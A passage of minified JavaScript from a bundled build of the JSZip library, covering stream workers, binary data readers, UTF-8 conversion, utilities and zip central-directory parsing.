g=this;(this._stream=c).pause(),c.on("data",function(v){g.push({data:v,meta:{percent:0}})}).on("error",function(v){g.isPaused?this.generatedError=v:g.error(v)}).on("end",function(){g.isPaused?g._upstreamEnded=!0:g.end()})},n.prototype.pause=function(){return!!a.prototype.pause.call(this)&&(this._stream.pause(),!0)},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(this._upstreamEnded?this.end():this._stream.resume(),!0)},r.exports=n},{"../stream/GenericWorker":28,"../utils":32}],13:[function(t,r,s){var o=t("readable-stream").Readable;function a(n,c,g){o.call(this,c),this._helper=n;var v=this;n.on("data",function(d,f){v.push(d)||v._helper.pause(),g&&g(f)}).on("error",function(d){v.emit("error",d)}).on("end",function(){v.push(null)})}t("../utils").inherits(a,o),a.prototype._read=function(){this._helper.resume()},r.exports=a},{"../utils":32,"readable-stream":16}],14:[function(t,r,s){r.exports={isNode:typeof Buffer<"u",newBufferFrom:function(o,a){if(Buffer.from&&Buffer.from!==Uint8Array.from)return Buffer.from(o,a);if(typeof o=="number")throw new Error('The "data" argument must not be a number');return new Buffer(o,a)},allocBuffer:function(o){if(Buffer.alloc)return Buffer.alloc(o);var a=new Buffer(o);return a.fill(0),a},isBuffer:function(o){return Buffer.isBuffer(o)},isStream:function(o){return o&&typeof o.on=="function"&&typeof o.pause=="function"&&typeof o.resume=="function"}}},{}],15:[function(t,r,s){function o(z,M,O){var j,P=n.getTypeOf(M),U=n.extend(O||{},v);U.date=U.date||new Date,U.compression!==null&&(U.compression=U.compression.toUpperCase()),typeof U.unixPermissions=="string"&&(U.unixPermissions=parseInt(U.unixPermissions,8)),U.unixPermissions&&16384&U.unixPermissions&&(U.dir=!0),U.dosPermissions&&16&U.dosPermissions&&(U.dir=!0),U.dir&&(z=b(z)),U.createFolders&&(j=y(z))&&k.call(this,j,!0);var Y=P==="string"&&U.binary===!1&&U.base64===!1;O&&O.binary!==void 0||(U.binary=!Y),(M instanceof d&&M.uncompressedSize===0||U.dir||!M||M.length===0)&&(U.base64=!1,U.binary=!0,M="",U.compression="STORE",P="string");var S=null;S=M instanceof d||M instanceof c?M:m.isNode&&m.isStream(M)?new u(z,M):n.prepareContent(z,M,U.binary,U.optimizedBinaryString,U.base64);var H=new f(z,S,U);this.files[z]=H}var a=t("./utf8"),n=t("./utils"),c=t("./stream/GenericWorker"),g=t("./stream/StreamHelper"),v=t("./defaults"),d=t("./compressedObject"),f=t("./zipObject"),h=t("./generate"),m=t("./nodejsUtils"),u=t("./nodejs/NodejsStreamInputAdapter"),y=function(z){z.slice(-1)==="/"&&(z=z.substring(0,z.length-1));var M=z.lastIndexOf("/");return 0<M?z.substring(0,M):""},b=function(z){return z.slice(-1)!=="/"&&(z+="/"),z},k=function(z,M){return M=M!==void 0?M:v.createFolders,z=b(z),this.files[z]||o.call(this,z,null,{dir:!0,createFolders:M}),this.files[z]};function x(z){return Object.prototype.toString.call(z)==="[object RegExp]"}var I={load:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},forEach:function(z){var M,O,j;for(M in this.files)j=this.files[M],(O=M.slice(this.root.length,M.length))&&M.slice(0,this.root.length)===this.root&&z(O,j)},filter:function(z){var M=[];return this.forEach(function(O,j){z(O,j)&&M.push(j)}),M},file:function(z,M,O){if(arguments.length!==1)return z=this.root+z,o.call(this,z,M,O),this;if(x(z)){var j=z;return this.filter(function(U,Y){return!Y.dir&&j.test(U)})}var P=this.files[this.root+z];return P&&!P.dir?P:null},folder:function(z){if(!z)return this;if(x(z))return this.filter(function(P,U){return U.dir&&z.test(P)});var M=this.root+z,O=k.call(this,M),j=this.clone();return j.root=O.name,j},remove:function(z){z=this.root+z;var M=this.files[z];if(M||(z.slice(-1)!=="/"&&(z+="/"),M=this.files[z]),M&&!M.dir)delete this.files[z];else for(var O=this.filter(function(P,U){return U.name.slice(0,z.length)===z}),j=0;j<O.length;j++)delete this.files[O[j].name];return this},generate:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},generateInternalStream:function(z){var M,O={};try{if((O=n.extend(z||{},{streamFiles:!1,compression:"STORE",compressionOptions:null,type:"",platform:"DOS",comment:null,mimeType:"application/zip",encodeFileName:a.utf8encode})).type=O.type.toLowerCase(),O.compression=O.compression.toUpperCase(),O.type==="binarystring"&&(O.type="string"),!O.type)throw new Error("No output type specified.");n.checkSupport(O.type),O.platform!=="darwin"&&O.platform!=="freebsd"&&O.platform!=="linux"&&O.platform!=="sunos"||(O.platform="UNIX"),O.platform==="win32"&&(O.platform="DOS");var j=O.comment||this.comment||"";M=h.generateWorker(this,O,j)}catch(P){(M=new c("error")).error(P)}return new g(M,O.type||"string",O.mimeType)},generateAsync:function(z,M){return this.generateInternalStream(z).accumulate(M)},generateNodeStream:function(z,M){return(z=z||{}).type||(z.type="nodebuffer"),this.generateInternalStream(z).toNodejsStream(M)}};r.exports=I},{"./compressedObject":2,"./defaults":5,"./generate":9,"./nodejs/NodejsStreamInputAdapter":12,"./nodejsUtils":14,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31,"./utils":32,"./zipObject":35}],16:[function(t,r,s){r.exports=t("stream")},{stream:void 0}],17:[function(t,r,s){var o=t("./DataReader");function a(n){o.call(this,n);for(var c=0;c<this.data.length;c++)n[c]=255&n[c]}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data[this.zero+n]},a.prototype.lastIndexOfSignature=function(n){for(var c=n.charCodeAt(0),g=n.charCodeAt(1),v=n.charCodeAt(2),d=n.charCodeAt(3),f=this.length-4;0<=f;--f)if(this.data[f]===c&&this.data[f+1]===g&&this.data[f+2]===v&&this.data[f+3]===d)return f-this.zero;return-1},a.prototype.readAndCheckSignature=function(n){var c=n.charCodeAt(0),g=n.charCodeAt(1),v=n.charCodeAt(2),d=n.charCodeAt(3),f=this.readData(4);return c===f[0]&&g===f[1]&&v===f[2]&&d===f[3]},a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return[];var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},r.exports=a},{"../utils":32,"./DataReader":18}],18:[function(t,r,s){var o=t("../utils");function a(n){this.data=n,this.length=n.length,this.index=0,this.zero=0}a.prototype={checkOffset:function(n){this.checkIndex(this.index+n)},checkIndex:function(n){if(this.length<this.zero+n||n<0)throw new Error("End of data reached (data length = "+this.length+", asked index = "+n+"). Corrupted zip ?")},setIndex:function(n){this.checkIndex(n),this.index=n},skip:function(n){this.setIndex(this.index+n)},byteAt:function(){},readInt:function(n){var c,g=0;for(this.checkOffset(n),c=this.index+n-1;c>=this.index;c--)g=(g<<8)+this.byteAt(c);return this.index+=n,g},readString:function(n){return o.transformTo("string",this.readData(n))},readData:function(){},lastIndexOfSignature:function(){},readAndCheckSignature:function(){},readDate:function(){var n=this.readInt(4);return new Date(Date.UTC(1980+(n>>25&127),(n>>21&15)-1,n>>16&31,n>>11&31,n>>5&63,(31&n)<<1))}},r.exports=a},{"../utils":32}],19:[function(t,r,s){var o=t("./Uint8ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){this.checkOffset(n);var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},r.exports=a},{"../utils":32,"./Uint8ArrayReader":21}],20:[function(t,r,s){var o=t("./DataReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data.charCodeAt(this.zero+n)},a.prototype.lastIndexOfSignature=function(n){return this.data.lastIndexOf(n)-this.zero},a.prototype.readAndCheckSignature=function(n){return n===this.readData(4)},a.prototype.readData=function(n){this.checkOffset(n);var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},r.exports=a},{"../utils":32,"./DataReader":18}],21:[function(t,r,s){var o=t("./ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return new Uint8Array(0);var c=this.data.subarray(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},r.exports=a},{"../utils":32,"./ArrayReader":17}],22:[function(t,r,s){var o=t("../utils"),a=t("../support"),n=t("./ArrayReader"),c=t("./StringReader"),g=t("./NodeBufferReader"),v=t("./Uint8ArrayReader");r.exports=function(d){var f=o.getTypeOf(d);return o.checkSupport(f),f!=="string"||a.uint8array?f==="nodebuffer"?new g(d):a.uint8array?new v(o.transformTo("uint8array",d)):new n(o.transformTo("array",d)):new c(d)}},{"../support":30,"../utils":32,"./ArrayReader":17,"./NodeBufferReader":19,"./StringReader":20,"./Uint8ArrayReader":21}],23:[function(t,r,s){s.LOCAL_FILE_HEADER="PK",s.CENTRAL_FILE_HEADER="PK",s.CENTRAL_DIRECTORY_END="PK",s.ZIP64_CENTRAL_DIRECTORY_LOCATOR="PK\x07",s.ZIP64_CENTRAL_DIRECTORY_END="PK",s.DATA_DESCRIPTOR="PK\x07\b"},{}],24:[function(t,r,s){var o=t("./GenericWorker"),a=t("../utils");function n(c){o.call(this,"ConvertWorker to "+c),this.destType=c}a.inherits(n,o),n.prototype.processChunk=function(c){this.push({data:a.transformTo(this.destType,c.data),meta:c.meta})},r.exports=n},{"../utils":32,"./GenericWorker":28}],25:[function(t,r,s){var o=t("./GenericWorker"),a=t("../crc32");function n(){o.call(this,"Crc32Probe"),this.withStreamInfo("crc32",0)}t("../utils").inherits(n,o),n.prototype.processChunk=function(c){this.streamInfo.crc32=a(c.data,this.streamInfo.crc32||0),this.push(c)},r.exports=n},{"../crc32":4,"../utils":32,"./GenericWorker":28}],26:[function(t,r,s){var o=t("../utils"),a=t("./GenericWorker");function n(c){a.call(this,"DataLengthProbe for "+c),this.propName=c,this.withStreamInfo(c,0)}o.inherits(n,a),n.prototype.processChunk=function(c){if(c){var g=this.streamInfo[this.propName]||0;this.streamInfo[this.propName]=g+c.data.length}a.prototype.processChunk.call(this,c)},r.exports=n},{"../utils":32,"./GenericWorker":28}],27:[function(t,r,s){var o=t("../utils"),a=t("./GenericWorker");function n(c){a.call(this,"DataWorker");var g=this;this.dataIsReady=!1,this.index=0,this.max=0,this.data=null,this.type="",this._tickScheduled=!1,c.then(function(v){g.dataIsReady=!0,g.data=v,g.max=v&&v.length||0,g.type=o.getTypeOf(v),g.isPaused||g._tickAndRepeat()},function(v){g.error(v)})}o.inherits(n,a),n.prototype.cleanUp=function(){a.prototype.cleanUp.call(this),this.data=null},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(!this._tickScheduled&&this.dataIsReady&&(this._tickScheduled=!0,o.delay(this._tickAndRepeat,[],this)),!0)},n.prototype._tickAndRepeat=function(){this._tickScheduled=!1,this.isPaused||this.isFinished||(this._tick(),this.isFinished||(o.delay(this._tickAndRepeat,[],this),this._tickScheduled=!0))},n.prototype._tick=function(){if(this.isPaused||this.isFinished)return!1;var c=null,g=Math.min(this.max,this.index+16384);if(this.index>=this.max)return this.end();switch(this.type){case"string":c=this.data.substring(this.index,g);break;case"uint8array":c=this.data.subarray(this.index,g);break;case"array":case"nodebuffer":c=this.data.slice(this.index,g)}return this.index=g,this.push({data:c,meta:{percent:this.max?this.index/this.max*100:0}})},r.exports=n},{"../utils":32,"./GenericWorker":28}],28:[function(t,r,s){function o(a){this.name=a||"default",this.streamInfo={},this.generatedError=null,this.extraStreamInfo={},this.isPaused=!0,this.isFinished=!1,this.isLocked=!1,this._listeners={data:[],end:[],error:[]},this.previous=null}o.prototype={push:function(a){this.emit("data",a)},end:function(){if(this.isFinished)return!1;this.flush();try{this.emit("end"),this.cleanUp(),this.isFinished=!0}catch(a){this.emit("error",a)}return!0},error:function(a){return!this.isFinished&&(this.isPaused?this.generatedError=a:(this.isFinished=!0,this.emit("error",a),this.previous&&this.previous.error(a),this.cleanUp()),!0)},on:function(a,n){return this._listeners[a].push(n),this},cleanUp:function(){this.streamInfo=this.generatedError=this.extraStreamInfo=null,this._listeners=[]},emit:function(a,n){if(this._listeners[a])for(var c=0;c<this._listeners[a].length;c++)this._listeners[a][c].call(this,n)},pipe:function(a){return a.registerPrevious(this)},registerPrevious:function(a){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.streamInfo=a.streamInfo,this.mergeStreamInfo(),this.previous=a;var n=this;return a.on("data",function(c){n.processChunk(c)}),a.on("end",function(){n.end()}),a.on("error",function(c){n.error(c)}),this},pause:function(){return!this.isPaused&&!this.isFinished&&(this.isPaused=!0,this.previous&&this.previous.pause(),!0)},resume:function(){if(!this.isPaused||this.isFinished)return!1;var a=this.isPaused=!1;return this.generatedError&&(this.error(this.generatedError),a=!0),this.previous&&this.previous.resume(),!a},flush:function(){},processChunk:function(a){this.push(a)},withStreamInfo:function(a,n){return this.extraStreamInfo[a]=n,this.mergeStreamInfo(),this},mergeStreamInfo:function(){for(var a in this.extraStreamInfo)Object.prototype.hasOwnProperty.call(this.extraStreamInfo,a)&&(this.streamInfo[a]=this.extraStreamInfo[a])},lock:function(){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.isLocked=!0,this.previous&&this.previous.lock()},toString:function(){var a="Worker "+this.name;return this.previous?this.previous+" -> "+a:a}},r.exports=o},{}],29:[function(t,r,s){var o=t("../utils"),a=t("./ConvertWorker"),n=t("./GenericWorker"),c=t("../base64"),g=t("../support"),v=t("../external"),d=null;if(g.nodestream)try{d=t("../nodejs/NodejsStreamOutputAdapter")}catch{}function f(m,u){return new v.Promise(function(y,b){var k=[],x=m._internalType,I=m._outputType,z=m._mimeType;m.on("data",function(M,O){k.push(M),u&&u(O)}).on("error",function(M){k=[],b(M)}).on("end",function(){try{var M=(function(O,j,P){switch(O){case"blob":return o.newBlob(o.transformTo("arraybuffer",j),P);case"base64":return c.encode(j);default:return o.transformTo(O,j)}})(I,(function(O,j){var P,U=0,Y=null,S=0;for(P=0;P<j.length;P++)S+=j[P].length;switch(O){case"string":return j.join("");case"array":return Array.prototype.concat.apply([],j);case"uint8array":for(Y=new Uint8Array(S),P=0;P<j.length;P++)Y.set(j[P],U),U+=j[P].length;return Y;case"nodebuffer":return Buffer.concat(j);default:throw new Error("concat : unsupported type '"+O+"'")}})(x,k),z);y(M)}catch(O){b(O)}k=[]}).resume()})}function h(m,u,y){var b=u;switch(u){case"blob":case"arraybuffer":b="uint8array";break;case"base64":b="string"}try{this._internalType=b,this._outputType=u,this._mimeType=y,o.checkSupport(b),this._worker=m.pipe(new a(b)),m.lock()}catch(k){this._worker=new n("error"),this._worker.error(k)}}h.prototype={accumulate:function(m){return f(this,m)},on:function(m,u){var y=this;return m==="data"?this._worker.on(m,function(b){u.call(y,b.data,b.meta)}):this._worker.on(m,function(){o.delay(u,arguments,y)}),this},resume:function(){return o.delay(this._worker.resume,[],this._worker),this},pause:function(){return this._worker.pause(),this},toNodejsStream:function(m){if(o.checkSupport("nodestream"),this._outputType!=="nodebuffer")throw new Error(this._outputType+" is not supported by this method");return new d(this,{objectMode:this._outputType!=="nodebuffer"},m)}},r.exports=h},{"../base64":1,"../external":6,"../nodejs/NodejsStreamOutputAdapter":13,"../support":30,"../utils":32,"./ConvertWorker":24,"./GenericWorker":28}],30:[function(t,r,s){if(s.base64=!0,s.array=!0,s.string=!0,s.arraybuffer=typeof ArrayBuffer<"u"&&typeof Uint8Array<"u",s.nodebuffer=typeof Buffer<"u",s.uint8array=typeof Uint8Array<"u",typeof ArrayBuffer>"u")s.blob=!1;else{var o=new ArrayBuffer(0);try{s.blob=new Blob([o],{type:"application/zip"}).size===0}catch{try{var a=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);a.append(o),s.blob=a.getBlob("application/zip").size===0}catch{s.blob=!1}}}try{s.nodestream=!!t("readable-stream").Readable}catch{s.nodestream=!1}},{"readable-stream":16}],31:[function(t,r,s){for(var o=t("./utils"),a=t("./support"),n=t("./nodejsUtils"),c=t("./stream/GenericWorker"),g=new Array(256),v=0;v<256;v++)g[v]=252<=v?6:248<=v?5:240<=v?4:224<=v?3:192<=v?2:1;g[254]=g[254]=1;function d(){c.call(this,"utf-8 decode"),this.leftOver=null}function f(){c.call(this,"utf-8 encode")}s.utf8encode=function(h){return a.nodebuffer?n.newBufferFrom(h,"utf-8"):(function(m){var u,y,b,k,x,I=m.length,z=0;for(k=0;k<I;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<I&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),z+=y<128?1:y<2048?2:y<65536?3:4;for(u=a.uint8array?new Uint8Array(z):new Array(z),k=x=0;x<z;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<I&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),y<128?u[x++]=y:(y<2048?u[x++]=192|y>>>6:(y<65536?u[x++]=224|y>>>12:(u[x++]=240|y>>>18,u[x++]=128|y>>>12&63),u[x++]=128|y>>>6&63),u[x++]=128|63&y);return u})(h)},s.utf8decode=function(h){return a.nodebuffer?o.transformTo("nodebuffer",h).toString("utf-8"):(function(m){var u,y,b,k,x=m.length,I=new Array(2*x);for(u=y=0;u<x;)if((b=m[u++])<128)I[y++]=b;else if(4<(k=g[b]))I[y++]=65533,u+=k-1;else{for(b&=k===2?31:k===3?15:7;1<k&&u<x;)b=b<<6|63&m[u++],k--;1<k?I[y++]=65533:b<65536?I[y++]=b:(b-=65536,I[y++]=55296|b>>10&1023,I[y++]=56320|1023&b)}return I.length!==y&&(I.subarray?I=I.subarray(0,y):I.length=y),o.applyFromCharCode(I)})(h=o.transformTo(a.uint8array?"uint8array":"array",h))},o.inherits(d,c),d.prototype.processChunk=function(h){var m=o.transformTo(a.uint8array?"uint8array":"array",h.data);if(this.leftOver&&this.leftOver.length){if(a.uint8array){var u=m;(m=new Uint8Array(u.length+this.leftOver.length)).set(this.leftOver,0),m.set(u,this.leftOver.length)}else m=this.leftOver.concat(m);this.leftOver=null}var y=(function(k,x){var I;for((x=x||k.length)>k.length&&(x=k.length),I=x-1;0<=I&&(192&k[I])==128;)I--;return I<0||I===0?x:I+g[k[I]]>x?I:x})(m),b=m;y!==m.length&&(a.uint8array?(b=m.subarray(0,y),this.leftOver=m.subarray(y,m.length)):(b=m.slice(0,y),this.leftOver=m.slice(y,m.length))),this.push({data:s.utf8decode(b),meta:h.meta})},d.prototype.flush=function(){this.leftOver&&this.leftOver.length&&(this.push({data:s.utf8decode(this.leftOver),meta:{}}),this.leftOver=null)},s.Utf8DecodeWorker=d,o.inherits(f,c),f.prototype.processChunk=function(h){this.push({data:s.utf8encode(h.data),meta:h.meta})},s.Utf8EncodeWorker=f},{"./nodejsUtils":14,"./stream/GenericWorker":28,"./support":30,"./utils":32}],32:[function(t,r,s){var o=t("./support"),a=t("./base64"),n=t("./nodejsUtils"),c=t("./external");function g(u){return u}function v(u,y){for(var b=0;b<u.length;++b)y[b]=255&u.charCodeAt(b);return y}t("setimmediate"),s.newBlob=function(u,y){s.checkSupport("blob");try{return new Blob([u],{type:y})}catch{try{var b=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);return b.append(u),b.getBlob(y)}catch{throw new Error("Bug : can't construct the Blob.")}}};var d={stringifyByChunk:function(u,y,b){var k=[],x=0,I=u.length;if(I<=b)return String.fromCharCode.apply(null,u);for(;x<I;)y==="array"||y==="nodebuffer"?k.push(String.fromCharCode.apply(null,u.slice(x,Math.min(x+b,I)))):k.push(String.fromCharCode.apply(null,u.subarray(x,Math.min(x+b,I)))),x+=b;return k.join("")},stringifyByChar:function(u){for(var y="",b=0;b<u.length;b++)y+=String.fromCharCode(u[b]);return y},applyCanBeUsed:{uint8array:(function(){try{return o.uint8array&&String.fromCharCode.apply(null,new Uint8Array(1)).length===1}catch{return!1}})(),nodebuffer:(function(){try{return o.nodebuffer&&String.fromCharCode.apply(null,n.allocBuffer(1)).length===1}catch{return!1}})()}};function f(u){var y=65536,b=s.getTypeOf(u),k=!0;if(b==="uint8array"?k=d.applyCanBeUsed.uint8array:b==="nodebuffer"&&(k=d.applyCanBeUsed.nodebuffer),k)for(;1<y;)try{return d.stringifyByChunk(u,b,y)}catch{y=Math.floor(y/2)}return d.stringifyByChar(u)}function h(u,y){for(var b=0;b<u.length;b++)y[b]=u[b];return y}s.applyFromCharCode=f;var m={};m.string={string:g,array:function(u){return v(u,new Array(u.length))},arraybuffer:function(u){return m.string.uint8array(u).buffer},uint8array:function(u){return v(u,new Uint8Array(u.length))},nodebuffer:function(u){return v(u,n.allocBuffer(u.length))}},m.array={string:f,array:g,arraybuffer:function(u){return new Uint8Array(u).buffer},uint8array:function(u){return new Uint8Array(u)},nodebuffer:function(u){return n.newBufferFrom(u)}},m.arraybuffer={string:function(u){return f(new Uint8Array(u))},array:function(u){return h(new Uint8Array(u),new Array(u.byteLength))},arraybuffer:g,uint8array:function(u){return new Uint8Array(u)},nodebuffer:function(u){return n.newBufferFrom(new Uint8Array(u))}},m.uint8array={string:f,array:function(u){return h(u,new Array(u.length))},arraybuffer:function(u){return u.buffer},uint8array:g,nodebuffer:function(u){return n.newBufferFrom(u)}},m.nodebuffer={string:f,array:function(u){return h(u,new Array(u.length))},arraybuffer:function(u){return m.nodebuffer.uint8array(u).buffer},uint8array:function(u){return h(u,new Uint8Array(u.length))},nodebuffer:g},s.transformTo=function(u,y){if(y=y||"",!u)return y;s.checkSupport(u);var b=s.getTypeOf(y);return m[b][u](y)},s.resolve=function(u){for(var y=u.split("/"),b=[],k=0;k<y.length;k++){var x=y[k];x==="."||x===""&&k!==0&&k!==y.length-1||(x===".."?b.pop():b.push(x))}return b.join("/")},s.getTypeOf=function(u){return typeof u=="string"?"string":Object.prototype.toString.call(u)==="[object Array]"?"array":o.nodebuffer&&n.isBuffer(u)?"nodebuffer":o.uint8array&&u instanceof Uint8Array?"uint8array":o.arraybuffer&&u instanceof ArrayBuffer?"arraybuffer":void 0},s.checkSupport=function(u){if(!o[u.toLowerCase()])throw new Error(u+" is not supported by this platform")},s.MAX_VALUE_16BITS=65535,s.MAX_VALUE_32BITS=-1,s.pretty=function(u){var y,b,k="";for(b=0;b<(u||"").length;b++)k+="\\x"+((y=u.charCodeAt(b))<16?"0":"")+y.toString(16).toUpperCase();return k},s.delay=function(u,y,b){setImmediate(function(){u.apply(b||null,y||[])})},s.inherits=function(u,y){function b(){}b.prototype=y.prototype,u.prototype=new b},s.extend=function(){var u,y,b={};for(u=0;u<arguments.length;u++)for(y in arguments[u])Object.prototype.hasOwnProperty.call(arguments[u],y)&&b[y]===void 0&&(b[y]=arguments[u][y]);return b},s.prepareContent=function(u,y,b,k,x){return c.Promise.resolve(y).then(function(I){return o.blob&&(I instanceof Blob||["[object File]","[object Blob]"].indexOf(Object.prototype.toString.call(I))!==-1)&&typeof FileReader<"u"?new c.Promise(function(z,M){var O=new FileReader;O.onload=function(j){z(j.target.result)},O.onerror=function(j){M(j.target.error)},O.readAsArrayBuffer(I)}):I}).then(function(I){var z=s.getTypeOf(I);return z?(z==="arraybuffer"?I=s.transformTo("uint8array",I):z==="string"&&(x?I=a.decode(I):b&&k!==!0&&(I=(function(M){return v(M,o.uint8array?new Uint8Array(M.length):new Array(M.length))})(I))),I):c.Promise.reject(new Error("Can't read the data of '"+u+"'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"))})}},{"./base64":1,"./external":6,"./nodejsUtils":14,"./support":30,setimmediate:54}],33:[function(t,r,s){var o=t("./reader/readerFor"),a=t("./utils"),n=t("./signature"),c=t("./zipEntry"),g=t("./support");function v(d){this.files=[],this.loadOptions=d}v.prototype={checkSignature:function(d){if(!this.reader.readAndCheckSignature(d)){this.reader.index-=4;var f=this.reader.readString(4);throw new Error("Corrupted zip or bug: unexpected signature ("+a.pretty(f)+", expected "+a.pretty(d)+")")}},isSignature:function(d,f){var h=this.reader.index;this.reader.setIndex(d);var m=this.reader.readString(4)===f;return this.reader.setIndex(h),m},readBlockEndOfCentral:function(){this.diskNumber=this.reader.readInt(2),this.diskWithCentralDirStart=this.reader.readInt(2),this.centralDirRecordsOnThisDisk=this.reader.readInt(2),this.centralDirRecords=this.reader.readInt(2),this.centralDirSize=this.reader.readInt(4),this.centralDirOffset=this.reader.readInt(4),this.zipCommentLength=this.reader.readInt(2);var d=this.reader.readData(this.zipCommentLength),f=g.uint8array?"uint8array":"array",h=a.transformTo(f,d);this.zipComment=this.loadOptions.decodeFileName(h)},readBlockZip64EndOfCentral:function(){this.zip64EndOfCentralSize=this.reader.readInt(8),this.reader.skip(4),this.diskNumber=this.reader.readInt(4),this.diskWithCentralDirStart=this.reader.readInt(4),this.centralDirRecordsOnThisDisk=this.reader.readInt(8),this.centralDirRecords=this.reader.readInt(8),this.centralDirSize=this.reader.readInt(8),this.centralDirOffset=this.reader.readInt(8),this.zip64ExtensibleData={};for(var d,f,h,m=this.zip64EndOfCentralSize-44;0<m;)d=this.reader.readInt(2),f=this.reader.readInt(4),h=this.reader.readData(f),this.zip64ExtensibleData[d]={id:d,length:f,value:h}},readBlockZip64EndOfCentralLocator:function(){if(this.diskWithZip64CentralDirStart=this.reader.readInt(4),this.relativeOffsetEndOfZip64CentralDir=this.reader.readInt(8),this.disksCount=this.reader.readInt(4),1<this.disksCount)throw new Error("Multi-volumes zip are not supported")},readLocalFiles:function(){var d,f;for(d=0;d<this.files.length;d++)f=this.files[d],this.reader.setIndex(f.localHeaderOffset),this.checkSignature(n.LOCAL_FILE_HEADER),f.readLocalPart(this.reader),f.handleUTF8(),f.processAttributes()},readCentralDir:function(){var d;for(this.reader.setIndex(this.centralDirOffset);this.reader.readAndCheckSignature(n.CENTRAL_FILE_HEADER);)(d=new c({zip64:this.zip64},this.loadOptions)).readCentralPart(this.reader),this.files.push(d);if(this.centralDirRecords!==this.files.length&&this.centralDirRecords!==0&&this.files.length===0)throw new Error("Corrupted zip or bug: expected "+this.centralDirRecords+" records in central dir, got "+this.files.length)},readEndOfCentral:function(){var d=this.reader.lastIndexOfSignature(n.CENTRAL_DIRECTORY_END);if(d<0)throw this.isSignature(0,n.LOCAL_FILE_HEADER)?new Error("Corrupted zip: can't find end of central directory"):new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html");this.reader.setIndex(d);var f=d;if(this.checkSignature(n.CENTRAL_DIRECTORY_END),this.readBlockEndOfCentral(),this.diskNumber===a.MAX_VALUE_16BITS||this.diskWithCentralDirStart===a.MAX_VALUE_16BITS||this.centralDirRecordsOnThisDisk===a.MAX_VALUE_16BITS||this.centralDirRecords===a.MAX_VALUE_16BITS||this.centralDirSize===a.MAX_VALUE_32BITS||this.centralDirOffset===a.MAX_VALUE_32BITS){if(this.zip64=!0,(d=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR))<0)throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");if(this.reader.setIndex(d),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR),this.readBlockZip64EndOfCentralLocator(),!this.isSignature(this.relativeOffsetEndOfZip64CentralDir,n.ZIP64_CENTRAL_DIRECTORY_END)&&(this.relativeOffsetEndOfZip64CentralDir=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.relativeOffsetEndOfZip64CentralDir<0))throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.readBlockZip64EndOfCentral()}var h=this.centralDirOffset+this.centralDirSize;this.zip64&&(h+=20,h+=12+this.zip64EndOfCentralSize);var m=f-h;if(0<m)this.isSignature(f,n.CENTRAL_FILE_HEADER)||(this.reader.zero=m);else if(m<0)throw new Error("Corrupted zip: missing "+Math.abs(m)+" bytes.")},prepareReader:function(d){this.reader=o(d)},load:function(d){this.prepareReader(d),this.readEndOfCentral(),this.readCentralDir(),this.readLocalFiles()}},r.exports=v},{"./reader/readerFor":22,"./signature":23,"./support":30,"./utils":32,"./zipEntry":34}],34:[function(t,r,s){var o=t("./reader/readerFor"),a=t("./utils"),n=t("./compressedObject"),c=t("./crc32"),g=t("./utf8"),v=t("./compressions"),d=t("./support");function f(h,m){this.options=h,this.loadOptions=m}f.prototype={isEncrypted:function(){return(1&this.bitFlag)==1},useUTF8:function(){return(2048&this.bitFlag)==2048},readLocalPart:function(h){var m,u;if(h.skip(22),this.fileNameLength=h.readInt(2),u=h.readInt(2),this.fileName=h.readData(this.fileNameLength),h.skip(u),this.compressedSize===-1||this.uncompressedSize===-1)throw new Error("Bug or corrupted zip : didn't get enough information from the central directory (compressedSize === -1 || uncompressedSize === -1)");if((m=(function(y){for(var b in v)if(Object.prototype.hasOwnProperty.call(v,b)&&v[b].magic===y)return v[b];return null})(this.compressionMethod))===null)throw new Error("Corrupted zip : compression "+a.pretty(this.compressionMethod)+" unknown (inner file : "+a.transformTo("string",this.fileName)+")");this.decompressed=new n(this.compressedSize,this.uncompressedSize,this.crc32,m,h.readData(this.compressedSize))},readCentralPart:function(h){this.versionMadeBy=h.readInt(2),h.skip(2),this.bitFlag=h.readInt(2),this.compressionMethod=h.readString(2),this.date=h.readDate(),this.crc32=h.readInt(4),this.compressedSize=h.readInt(4),this.uncompressedSize=h.readInt(4);var m=h.readInt(2);if(this.extraFieldsLength=h.readInt(2),this.fileCommentLength=h.readInt(2),this.diskNumberStart=h.readInt(2),this.internalFileAttributes=h.readInt(2),this.externalFileAttributes=h.readInt(4),this.localHeaderOffset=h.readInt(4),this.isEncrypted())throw new Error("Encrypted zip are not 